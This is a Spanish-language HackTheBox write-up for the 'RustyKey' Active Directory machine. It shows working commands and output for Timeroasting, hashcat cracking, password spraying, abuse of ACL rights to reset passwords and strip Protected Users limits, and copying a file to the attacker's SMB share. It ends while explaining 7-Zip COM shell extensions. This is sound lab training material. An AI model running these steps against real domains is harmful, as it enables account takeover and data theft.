---
title: RustyKey - Hard (HTB)
permalink: /RustyKey-HTB-Writeup/
tags:
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: RustyKey - Hard (HTB)
seo_description: Enumera y explota diferentes servicios de Active Directory a través de ataques a cuentas de equipo, abuso de derechos ACL, secuestro de COM y abuso de RBCD para vencer RustyKey.
excerpt: Enumera y explota diferentes servicios de Active Directory a través de ataques a cuentas de equipo, abuso de derechos ACL, secuestro de COM y abuso de RBCD para vencer RustyKey.
header:
  overlay_image: /assets/images/headers/rustykey-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/rustykey-hackthebox.jpg
---
![image-center](/assets/images/posts/rustykey-hackthebox.png)
{: .align-center}

**Habilidades:** Kerberos Client Setup, `Timeroasting` Attack, Hash Cracking, Domain Analysis with `Bloodhound`, Password Spraying, Abusing AD ACL Rights - `AddSelf`, Abusing AD ACL Rights - `ForceChangePassword`, Abusing AD ACL Rights - `AddMember`,  Component Object Models (COM) Hijacking, Resource-Based Constrained Delegation (RBCD) Abuse [Privilege Escalation]
{: .notice--primary}

# Introducción

RustyKey es una máquina Windows de dificultad `Hard` en HackTheBox que requiere vulnerar un dominio de Active Directory mediante el uso de técnicas avanzadas de explotación y enumeración a diferentes servicios.

Comenzaremos con credenciales de un usuario sin privilegios, a través de `Timeroasting` para obtener credenciales de equipo en el dominio, donde explotaremos diversos derechos ACL para movernos lateralmente dentro del dominio.

La escalada de privilegios la realizaremos mediante un secuestro de COM para obtener acceso como un usuario que nos permita configurar un escenario de abuso de la delegación `kerberos` basada en recursos RBCD.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.75
 
PING 10.10.11.75 (10.10.11.75): 56 data bytes
64 bytes from 10.10.11.75: icmp_seq=0 ttl=127 time=1037.330 ms

--- 10.10.11.75 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 1037.330/1037.330/1037.330/0.000 ms
~~~


## Nmap Scanning 

Lanzaremos un escaneo de puertos que se encargue de identificar puertos abiertos en la máquina víctima. Primeramente emplearemos el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.75 -oG openPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 15:04 -03
Nmap scan report for 10.10.11.75
Host is up (0.26s latency).
Not shown: 61363 closed tcp ports (reset), 4145 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49682/tcp open  unknown
49697/tcp open  unknown
55779/tcp open  unknown
60052/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 31.69 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo que se encargue de identificar la versión y los servicios que se ejecutan en los puertos descubiertos

~~~ bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49676,49677,49682,49697,55779,60052 -sVC 10.10.11.75 -oN services
      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 15:06 -03
Nmap scan report for 10.10.11.75
Host is up (0.58s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-27 02:06:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
55779/tcp open  msrpc         Microsoft Windows RPC
60052/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-27T02:07:35
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m03s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.85 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos servicios típicos de Active Directory, como `DNS`, `kerberos`, `LDAP`, `SMB`, etc.), por lo que podemos deducir que estamos frente a un Controlador de Dominio. 

Además vemos tanto el nombre del dominio como del DC, agregaremos esta información a nuestro archivo `/etc/hosts` para aplicar correctamente la resolución DNS cuando hagamos referencia al dominio

``` bash
echo '10.10.11.75 rustykey.htb dc.rustykey.htb' | sudo tee -a /etc/hosts
 
10.10.11.75 rustykey.htb dc.rustykey.htb
```


## Initial Enumeration

Comenzaremos con una enumeración aprovechando las credenciales proporcionadas. Si intentamos autenticarnos para verificar información del controlador de dominio, notaremos que NTLM se encuentra deshabilitado

``` bash
nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A'
SMB         10.10.11.75     445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.10.11.75     445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```

### Kerberos Authentication and Client Setup

En este escenario, no es posible el `fallback` hacia el protocolo NTLM debido a que se encuentra deshabilitado

> Antes de emplear autenticación `kerberos`, debemos recordar sincronizar nuestro reloj local con el del Controlador de Dominio

``` bash
ntpdate dc.rustykey.htb
```

Ahora cuando usemos el parámetro `-k` para usar `kerberos`, el DC aceptará la autenticación de `rr.parker`

``` bash
nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
```

Desde `netexec` es posible generar un archivo de configuración de cliente `kerberos` utilizando el parámetro `--generate-krb5-file`

``` bash
nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --generate-krb5-file ./krb5.conf
```

Entonces cuando en el futuro debamos usar nuestro cliente `kerberos`, como por ejemplo en autenticación mediante `WinRM`, podemos exportar la nueva configuración de la siguiente manera

``` bash
export KRB5_CONFIG=./krb5.conf
```

Para el uso de herramientas para enumerar el dominio, es posible que necesitemos cargar un ticket manualmente. Podemos solicitarlo con la herramienta `getTGT` de `impacket`

``` bash
getTGT.py rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.10.11.75

# Load ticket as env variable
export KRB5CCNAME=rr.parker.ccache
```

### Users

Con herramientas como `rpcclient` podemos enumerar usuarios del dominio de la siguiente manera

``` bash
rpcclient dc.rustykey.htb --use-kerberos=required -c enumdomusers
 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[rr.parker] rid:[0x471]
user:[mm.turner] rid:[0x472]
user:[bb.morgan] rid:[0x473]
user:[gg.anderson] rid:[0x474]
user:[dd.ali] rid:[0x477]
user:[ee.reed] rid:[0x479]
user:[nn.marcos] rid:[0x47a]
user:[backupadmin] rid:[0xe11]
```

Podemos aplicar un pequeño tratamiento a esta salida para rápidamente obtener un listado de usuarios válidos en el dominio

``` bash
rpcclient dc.rustykey.htb --use-kerberos=required -c enumdomusers | cut -d ' ' -f1-1 | cut -d ':' -f2-2 | tr -d '[]' | tee users.txt

Administrator
Guest
krbtgt
rr.parker
mm.turner
bb.morgan
gg.anderson
dd.ali
ee.reed
nn.marcos
backupadmin
```

### (Failed) AS-REP Roast

Podemos cazar dos pájaros de un solo tiro y usar `kerbrute` como para validar a estos usuarios así también como verificar si son vulnerables a `AS-REP Roast`

``` bash
kerbrute userenum -d rustykey.htb --dc 10.10.11.75 users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/26/25 - Ronnie Flathers @ropnop

2025/10/26 15:49:33 >  Using KDC(s):
2025/10/26 15:49:33 >  	10.10.11.75:88

2025/10/26 15:49:34 >  [+] VALID USERNAME:	mm.turner@rustykey.htb
2025/10/26 15:49:34 >  [!] ee.reed@rustykey.htb - KRB Error: (14) KDC_ERR_ETYPE_NOSUPP KDC has no support for encryption type
2025/10/26 15:49:34 >  [+] VALID USERNAME:	rr.parker@rustykey.htb
2025/10/26 15:49:34 >  [!] bb.morgan@rustykey.htb - KRB Error: (14) KDC_ERR_ETYPE_NOSUPP KDC has no support for encryption type
2025/10/26 15:49:34 >  [+] VALID USERNAME:	dd.ali@rustykey.htb
2025/10/26 15:49:34 >  [+] VALID USERNAME:	Administrator@rustykey.htb
2025/10/26 15:49:34 >  [+] VALID USERNAME:	nn.marcos@rustykey.htb
2025/10/26 15:49:34 >  [+] VALID USERNAME:	backupadmin@rustykey.htb
2025/10/26 15:49:34 >  Done! Tested 11 usernames (6 valid) in 0.977 seconds
```

### (Failed) Kerberoasting

De igual manera verificaremos si existe algún usuario que sea vulnerable a `Kerberoasting`

```
GetUserSPNs.py rustykey.htb/rr.parker@dc.rustykey.htb -k -no-pass -dc-host dc.rustykey.htb
  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

### Bloodhound

Como disponemos de credenciales válidas y no hemos encontrado un vector evidente para movernos lateralmente por el dominio, recolectaremos información para cargarla y analizarla en `Bloodhound` con la herramienta `bloodhound-ce-python` o `rusthound`

``` bash
bloodhound-ce-python -d rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k -ns 10.10.11.75 -c All
```
<br>


# Intrusión / Explotación
---
## `Timeroasting`

La técnica [`Timeroasting`]() abusa del mecanismo de sincronización de tiempo (protocolo NTP/SNTP implementado por Microsoft) en escenarios Windows/Active Directory para obtener hashes (valores criptográficos) derivados de las contraseñas de cuentas de equipo.

> `NTP` (Protocolo de Hora en Red) y SNTP (Protocolo Simple de Hora de Red) son protocolos para sincronizar relojes en una red, pero SNTP es una versión simplificada de NTP.

### Understanding Attack

Los equipos dentro de una red Windows suelen utilizar el protocolo NTP/SNTP para sincronizar sus relojes con el DC (que actúa como la fuente del tiempo), aunque implementan una [extensión](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sntp/8106cb73-ab3a-4542-8bc8-784dd32031cc) diseñada por Microsoft para evitar ataques de MitM.

Cuando un equipo necesita sincronizar su reloj, se incluirá el `RID` de su cuenta de equipo en un campo de extensión en la solicitud NTP. El servidor responde con un código de autenticación de mensajes (`MAC`), el cual es calculado en base al hash NTLM de la cuenta objetivo.

> El atacante basta con conocer el RID de las cuentas de equipo objetivo, y como este valor es un tanto predecible, es posible utilizar un rango de RIDs para enviar solicitudes.

Con estos hashes derivados de las cuentas de equipo y la suma de otros parámetros de las respuestas NTP, es posible intentos de ataque offline basados en diccionarios mediante la reconstrucción de estos hashes con contraseñas candidatas. Para esto podemos usar la herramienta `hashcat` que implementa el modo `31300` (`MS SNTP`)

``` bash
hashcat --example-hashes | grep 31300 -A 1 
Hash mode #31300
  Name................: MS SNTP
```

### Exploiting

Con la herramienta [`timeroast.py`](https://github.com/SecuraBV/Timeroast) podremos extraer los hashes correspondientes a las cuentas de equipo del dominio

~~~ bash
python3 timeroast.py 10.10.11.75 | tee hashes.txt

1000:$sntp-ms$6ff5a1c9d26b623209e5a59742291b41$1c0111e900000000000a6aa54c4f434ceca8e0a77a3ef78ce1b8428bffbfcd0aeca96d40be5751f6eca96d40be57a786
1103:$sntp-ms$1373fba73fdfec83f1a7a68e2b93759b$1c0111e900000000000a6aa64c4f434ceca8e0a778c753e7e1b8428bffbfcd0aeca96d4174f01902eca96d4174f05dcb
...
<SNIP>
...
~~~

Podemos usar el script `timecrack.py` del repositorio para intentar descifrar estos hashes, aunque **demora muchísimo tiempo** en intentar descifrarlos

``` bash
python3 extra-scripts/timecrack.py hashes.txt /usr/local/share/wordlists/rockyou.txt
```

### Hash Cracking

De forma alternativa, podemos hacer un tratamiento del archivo para intentar descifrarlos con `hashcat`. Guardaremos estos hashes en un archivo de la siguiente forma aplicando un tratamiento

``` bash
cat hashes.txt | cut -d ':' -f2-2 | sponge hashes.txt
```

Intentaremos descifrar estos hashes con la herramienta `hashcat`, la cual tiene soporte para el algoritmo `MS SNTP`

``` bash
hashcat -a 0 -m 31300 hashes.txt /usr/local/share/wordlists/rockyou.txt

...
<SNIP>
...
$sntp-ms$59c75a68fe6f9c5503f77e0b6c39c32e$1c0111e900000000000a73644c4f434ceca8e0a77afb168ce1b8428bffbfcd0aeca978c8432c1d95eca978c8432c4e3c:Rusty88!
```

Hemos descubierto la contraseña `Rusty88!`, si intentamos hacer  `Password Spraying` para validar estas credenciales, no serán válidas para ningún usuario.

### Password Spraying

Como la credencial que logramos descifrar es válida para una cuenta de equipo y aún no disponemos de una lista de estas cuentas, comenzaremos enumerando las cuentas de equipo disponibles en el dominio con la ayuda de `netexec` y aplicando un pequeño tratamiento

``` bash
nxc ldap dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --computers | awk '{print $5}' | tail -n +4 | tee computers.txt

DC$
Support-Computer1$
Support-Computer2$
Support-Computer3$
Support-Computer4$
Support-Computer5$
Finance-Computer1$
Finance-Computer2$
Finance-Computer3$
Finance-Computer4$
Finance-Computer5$
IT-Computer1$
IT-Computer2$
IT-Computer3$
IT-Computer4$
IT-Computer5$
```

Si intentamos hacer `Password Spraying` pero ahora a las cuentas de equipo, podremos ver que las credenciales son válidas para el equipo `IT-Computer3$`

``` bash
nxc smb dc.rustykey.htb -u computers.txt -p 'Rusty88!' -k --continue-on-success
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\DC$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Support-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Support-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Support-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Support-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Support-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Finance-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Finance-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Finance-Computer3$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Finance-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Finance-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\IT-Computer1$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\IT-Computer2$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\IT-Computer3$:Rusty88! 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\IT-Computer4$:Rusty88! KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\IT-Computer5$:Rusty88! KDC_ERR_PREAUTH_FAILED
```

Como en este entorno solamente se acepta autenticación `kerberos`, solicitaremos un TGT para emplearlo en todas las conexiones que realicemos hacia el DC con esta cuenta

``` bash
getTGT.py 'rustykey.htb/IT-Computer3$:Rusty88!' -dc-ip dc.rustykey.htb

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-Computer3$.ccache
```

Además cargaremos el ticket como la variable de entorno `KRB5CCNAME`

``` bash
export KRB5CCNAME=$(pwd)/IT-Computer3\$.ccache
```


## Abusing AD ACL Rights - `AddSelf`

La cuenta de equipo `IT-Computer3$` tiene el derecho `AddSelf` sobre el grupo `Helpdesk`. Esto le permite añadirse a sí misma al grupo `Helpdesk` para formar parte de él

![image-center](/assets/images/posts/rustykey-1-hackthebox.png)
{: .align-center}

Podemos añadir a esta cuenta al grupo `Helpdesk` con múltiples herramientas, en mi caso he usado `bloodyAD`

``` bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -k add groupMember 'Helpdesk' 'IT-Computer3$'

[+] IT-Computer3$ added to Helpdesk
```


## Abusing AD ACL Rights - `ForceChangePassword`

El grupo `Helpdesk` posee el derecho `ForceChangePassword` sobre el siguiente listado de usuarios. Esto le permite forzar un cambio de contraseña sobre la cuenta objetivo

![image-center](/assets/images/posts/rustykey-2-hackthebox.png)
{: .align-center}

Si consultamos si estos usuarios pueden conectarse al dominio, notaremos que tanto `bb.morgan`, `gg.anderson` como `ee.reed` son miembros del grupo `Remote Management Users` 

![image-center](/assets/images/posts/rustykey-3-hackthebox.png)
{: .align-center}

Antes de cambiar la contraseña de `bb.morgan`, debemos renovar el TGT de `IT-Computer3$`, esto debido a la estructura de tickets `kerberos`, donde cada TGT contiene una copia del  [`PAC`](https://www.thehacker.recipes/ad/movement/kerberos/#tickets).

``` bash
getTGT.py 'rustykey.htb/IT-Computer3$:Rusty88!' -dc-ip dc.rustykey.htb
```

> `PAC` es una estructura que se incluye en los tickets de Kerberos en entornos de Active Directory, y contiene información de autorización del usuario, como sus permisos y privilegios de acceso.
{: .notice--info}

Luego de renovar el TGT para la cuenta `IT-Computer3$`, procederemos a cambiar la contraseña de `bb.morgan`

``` bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -k set password bb.morgan 'Password123!'

[+] Password changed successfully!
```

> Si intentamos solicitar un TGT para el usuario `bb.morgan`, debido a que `gg.anderson` no admite autenticación `kerberos` porque ha sido deshabilitada o bloqueada, obtendremos el error `KDC_ERR_CLIENT_REVOKED`.
{: .notice--warning}

### Protected Users

Vemos que todos los miembros de los grupos `IT` y `Support` forman parte del grupo inicial. Por ende todos contemplan las restricciones del grupo `Protected Users`

![image-center](/assets/images/posts/rustykey-4-hackthebox.png)
{: .align-center}

A su vez, este grupo contempla a sus miembros como parte del grupo [`Protected Users`](https://learn.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/protected-users-security-group#domain-controller-protections-for-protected-users)

> `Protected Users` es un grupo de seguridad global para Active Directory diseñado para ofrecer protección frente a ataques de robo de credenciales. El grupo activa una protección no configurable en dispositivos y equipos host para evitar que las credenciales se almacenen en la memoria caché cuando los miembros del grupo inicien sesión. 
{: .notice--info}

![image-center](/assets/images/posts/rustykey-5-hackthebox.png)
{: .align-center}


## Abusing AD ACL Rights - `AddMember`

El grupo `Helpdesk` posee el derecho `AddMember` sobre el grupo `Protected Objects`. Esto le permite a los miembros de `Helpdesk` tanto añadir como remover usuarios del grupo `Protected Objects`

![image-center](/assets/images/posts/rustykey-6-hackthebox.png)
{: .align-center}

Comenzaremos con eliminar la membresía del grupo `IT` con respecta al grupo `Protected Objects`, para que ya no posean estas restricciones de cuenta

``` bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'IT'

[+] IT removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB
```

Ahora si volvemos a intentar solicitar un TGT para `bb.morgan`, podremos obtener el TGT correctamente

``` bash
getTGT.py rustykey.htb/bb.morgan:'Password123!' -dc-ip dc.rustykey.htb

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
```


## Shell as `bb.morgan`

Podemos cargar el ticket en la variable `KRB5CCNAME` o simplemente utilizarlo dentro de la misma línea del comando con el que nos intentaremos conectar por `WinRM` al DC

``` bash
KRB5CCNAME=bb.morgan.ccache python3 evil_winrmexec.py dc.rustykey.htb -dc-ip 10.10.11.75 -k -no-pass
 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

PS C:\Users\bb.morgan\Documents> whoami
rustykey\bb.morgan
```

Ya podremos ver la primera flag del usuario sin privilegios

``` bash
PS C:\Users\bb.morgan\Documents> type ../Desktop/user.txt
731...
```
<br>


# Escalada de Privilegios
---
## Lateral Movement Path

En este punto nos encontramos dentro del DC, sin embargo, no disponemos de una ruta clara para escalar privilegios, por lo que debemos buscar una forma movernos lateralmente para buscar un vector más claro. 

Si listamos el escritorio, notaremos un archivo llamado `internal.pdf`

``` bash
PS C:\Users\bb.morgan\Documents> dir ..\Desktop

    Directory: C:\Users\bb.morgan\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---       11/10/2025  10:02 AM             34 user.txt
```

Para transferir este archivo, podemos usar recurso SMB desde nuestra IP. Podemos iniciar un servidor rápidamente con la herramienta `impacket-smbserver`

``` bash
smbserver.py share $(pwd) -smb2support -username andrew -password asdsa
```

Con el servidor iniciado, podemos crear una unidad de red para interactuar más cómodamente con nuestro recurso compartido

~~~ bash
PS C:\Users\bb.morgan\Documents> net use Z: \\10.10.15.64\share /user:andrew asdsa

The command completed successfully.
~~~

Ahora copiaremos el archivo `internal.pdf` al recurso `Z:` que creamos

``` bash
PS C:\Users\bb.morgan\Documents> copy ..\Desktop\internal.pdf Z:\
```

### Message from `bb.morgan`

El archivo `internal.pdf` contiene el siguiente mensaje que envió `bb.morgan` a `support-team`

``` text
From: bb.morgan@rustykey.htb
To: support-team@rustykey.htb
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100

Hey team,

As part of the new Support utilities rollout, extended access has been temporarily granted to allow testing and troubleshooting of file archiving features across shared workstations.

This is mainly to help streamline ticket resolution related to extraction/compression issues reported by the Finance and IT teams. Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.

A few notes:

- Please avoid making unrelated changes to system components while this access is active.
- This permission change is logged and will be rolled back once the archiving utility is confirmed stable in all environments.
- Let DevOps know if you encounter access errors or missing shell actions.

Thanks,

BB Morgan
IT Department
```

El correo anterior trata sobre un problema con las nuevas funcionalidades de archivado/compresión de archivos, donde:

- Los nuevos sistemas manejan las opciones del menú contextual de forma diferente, por ende, no pueden cargarse.
- Se propone como solución que miembros del grupo `Support` puedan hacer ajustes a niveles de registros elevados de forma temporal.

Si buscamos herramientas de archivado/compresión de archivos, notaremos que existe `7-Zip`

``` powershell
PS C:\Programdata> dir "C:\Program Files"

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/26/2024   8:24 PM                7-Zip
d-----       12/26/2024   4:28 PM                Common Files
d-----        6/24/2025   9:59 AM                internet explorer
d-----        7/24/2025   1:09 AM                VMware
d-r---        5/30/2025   3:02 PM                Windows Defender
d-----        6/24/2025   9:59 AM                Windows Defender Advanced Threat Protection                            
d-----        11/5/2022  12:03 PM                Windows Mail
d-----         6/5/2025   7:54 AM                Windows Media Player                                      
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        11/5/2022  12:03 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        9/15/2018  12:19 AM                WindowsPowerShell    
```

### Understanding Shell Extensions

> Los `Context Menu Actions` en Windows son un menú emergente que aparece al hacer clic con el botón derecho del ratón sobre un elemento, mostrando una lista de comandos y opciones relevantes para ese objeto.
{: .notice--info}

![image-center](/assets/images/posts/rustykey-7-hackthebox.png)
{: .align-center}

La manera en que las opciones de la herramienta de archivado/compresión aparezcan en el menú contextual, es a través de `Shell Extensions`.

> En Windows, las extensiones de shell son componentes de software que **agregan funcionalidades adicionales al Explorador de Archivos** más allá de sus capacidades básicas.
{: .notice--info}

#### Context Menu Handlers

Para manejar las opciones del menú contextual, se utiliza un tipo de `Shell Extensions`, el cual se conoce como `ContextMenuHandlers`

> Los **Context Menu Handlers** son un tipo específico de **Shell Extension (Extensión del _Shell_ de Windows)**. 
> 
> Su propósito es **añadir o modificar las opciones** que ves cuando haces **clic derecho** sobre un archivo, carpeta o cualquier otro objeto en el Explorador de Archivos de Windows.
{: .notice--info}

A nivel de registros, según la siguiente pregunta de [`Stack Exchange`](https://superuser.com/questions/290501/where-are-context-menu-actions-registered-in-the-registry), encontraremos las entradas del menú contextual en las siguientes claves de registro

``` powershell
HKCU\Software\Classes\*\ShellEx\ContextMenuHandlers       
HKCU\Software\Classes\Directory\ShellEx\ContextMenuHandlers
     
HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers
HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers 
```

Buscando en los registros, encontraremos los siguientes `ContextMenuHandlers`

``` powershell
PS C:\Programdata> reg query HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers

HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\7-Zip
HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\EncryptionMenu
HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\Offline Files
HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\Sharing
HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\{596AB062-B4D2-4215-9F74-E9109B0A8153}
```

Buscaremos el correspondiente a `7-Zip`, donde veremos un CLSID al consultar esta clave 

> El **CLSID** (`Class Identifier`), es un número único, largo y complejo (un UUID o GUID) que se utiliza en los sistemas operativos Windows para **identificar de forma única** a un componente de software específico, generalmente un objeto `COM` (`Component Object Model`).
{: .notice--info}

En lugar de buscar un programa por su nombre de archivo, Windows busca el CLSID asociado a ese componente de software

``` powershell
PS C:\Programdata> reg query HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers\7-Zip

HKEY_LOCAL_MACHINE\Software\Classes\Directory\ShellEx\ContextMenuHandlers\7-Zip
    (Default)    REG_SZ    {23170F69-40C1-278A-1000-000100020000}
```

El CLSID `{23170F69-40C1-278A-1000-000100020000}` es el que identifica la `Shell Extension` del programa `7-Zip`

![image-center](/assets/images/posts/rustykey-8-hackthebox.png)
{: .align-center}

### `7-Zip` Shell Extension

Esta clave de registro identifica al componente de software que ejecuta la extensión de `7-Zip`

``` powershell
PS C:\Programdata> reg query "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}"

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}
